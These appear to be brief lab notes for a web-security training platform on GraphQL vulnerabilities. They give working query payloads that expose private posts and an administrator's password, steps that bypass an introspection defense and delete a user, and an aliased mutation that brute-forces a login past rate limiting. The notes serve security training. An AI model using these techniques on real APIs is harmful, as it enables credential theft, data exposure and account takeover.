# GraphQL API Vulnerabilities

[GraphQL Visualizer](https://graphql-kit.com/graphql-voyager/)
## Lab: Accessing private GraphQL posts
```json
{"query":"\nquery getBlogSummaries {\n    getBlogPost(id:3) {\n        image\n        title\n        summary\n        id\n  isPrivate \n postPassword \n   }\n}","operationName":"getBlogSummaries"}
```

## Lab: Accidental exposure of private GraphQL fields

1. introspection query
2. find administrator
```json
{"query":"\nquery getUser {\n    getUser(id:1) {\n        id\n   username\n      password\n      }\n}","operationName":"getUser"}
```

## Lab: Finding a hidden GraphQL endpoint
1. Try common endpoint, find `/api`.
2. Bypass introspection defense by add a breaklin(%02a) after `__schema`.
3. Save the GraphQL queries to site map, and find the `getUser` and `deleteUser` Query.
4. Delete carlos(id: 3).

## Lab: Bypassing GraphQL brute force protections

Edit in `GraphQL` tab.
```json
 mutation {
        bruteforce0:login(input:{password: "123456", username: "carlos"}) {
              token
              success
          }
          ...
 }
```